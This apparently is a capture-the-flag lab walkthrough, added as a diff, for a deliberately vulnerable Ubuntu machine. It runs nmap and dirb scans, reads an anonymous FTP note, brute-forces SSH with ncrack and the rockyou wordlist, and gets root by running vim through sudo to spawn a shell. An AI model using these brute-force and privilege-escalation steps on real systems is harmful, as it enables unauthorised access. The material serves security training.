@@ -1,0 +1,194 @@
+1 .Reconnaisance
+ tool : nmap
+ command : nmap -A -T5 $IP
+ Ping Problem Resove command : nmap -Pn -A -T5 $IP
+
+Output :
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 15:04 IST
+Nmap scan report for 10.10.19.108
+Host is up (0.18s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.131.147
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+2)Exploring port 21(FTP) , 80(Http) , 2222(ssh)
+  a)Ftp
+
+  command : ftp $IP 
+  Nothing much in ftp
+  Found a ForMitch.txt 
+  Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
+226 Directory send OK.
+ftp> cd pub
+250 Directory successfully changed.
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
+226 Directory send OK.
+ftp> get ForMitch.txt
+local: ForMitch.txt remote: ForMitch.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
+226 Transfer complete.
+166 bytes received in 0.00 secs (695.7484 kB/s)
+  b)Http
+    Nothing in Page source
+    Content of Robots.txt
+    #
+# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
+#
+#   This file tells search engines not to index your CUPS server.
+#
+#   Copyright 1993-2003 by Easy Software Products.
+#
+#   These coded instructions, statements, and computer programs are the
+#   property of Easy Software Products and are protected by Federal
+#   copyright law.  Distribution and use rights are outlined in the file
+#   "LICENSE.txt" which should have been included with this file.  If this
+#   file is missing or damaged please contact Easy Software Products
+#   at:
+#
+#       Attn: CUPS Licensing Information
+#       Easy Software Products
+#       44141 Airport View Drive, Suite 204
+#       Hollywood, Maryland 20636-3111 USA
+#
+#       Voice: (301) 373-9600
+#       EMail: cups-info@cups.org
+#         WWW: http://www.cups.org
+#
+
+User-agent: *
+Disallow: /
+
+
+Disallow: /openemr-5_0_1_3 
+#
+# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
+#
+
+(NOTHING MUCH)
+Tool used : dirb (for directory crawling)
+     command : dirb http://$IP
+        
+Output :
+┌──(kali㉿kali)-[~/Desktop/thm]
+└─$ dirb http://10.10.19.108
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Jul  4 15:17:59 2021
+URL_BASE: http://10.10.19.108/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.19.108/ ----
+^S                                                                                                                                  + http://10.10.19.108/index.html (CODE:200|SIZE:11321)                                                                             
++ http://10.10.19.108/robots.txt (CODE:200|SIZE:929)                                                                               
++ http://10.10.19.108/server-status (CODE:403|SIZE:300)                                                                            
+==> DIRECTORY: http://10.10.19.108/simple/    
+
+
+3) Cracking mitch's password on bases of above text file
+   ForMitch.txt , user may be mitch Or Mitch
+   Let's go with mitch
+   Tool used : ncrack
+   command : 
+┌──(kali㉿kali)-[~]
+└─$ ncrack --user mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.19.108:2222
+ Output :
+
+Starting Ncrack 0.7 ( http://ncrack.org ) at 2021-07-04 17:12 IST
+Stats: 0:02:52 elapsed; 0 services completed (1 total)
+Rate: 4.61; Found: 1; About 0.01% done
+(press 'p' to list discovered credentials)
+Discovered credentials for ssh on 10.10.19.108 2222/tcp:
+10.10.19.108 2222/tcp ssh: 'mitch' 'secret'
+
+4) Gaining Access to ssh
+  command ssh mitch@$IP -p 2222
+ Output
+ The authenticity of host '[10.10.19.108]:2222 ([10.10.19.108]:2222)' can't be established.
+ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.19.108]:2222' (ECDSA) to the list of known hosts.
+mitch@10.10.19.108's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ 
+found and read user.txt here
+
+5) Privelige escalation
+   command : sudo -l
+ser mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+
+ we can execute vim to attain root authority
+
+  mitch@Machine:/home$ sudo vim -c ':!/bin/bash'
+
+root@Machine:/home# 
+
+read root.txt 
+
+And Kudos !! our machine is completed
+
+
+
+
+
+
+
+
+
+
+
+
+
+
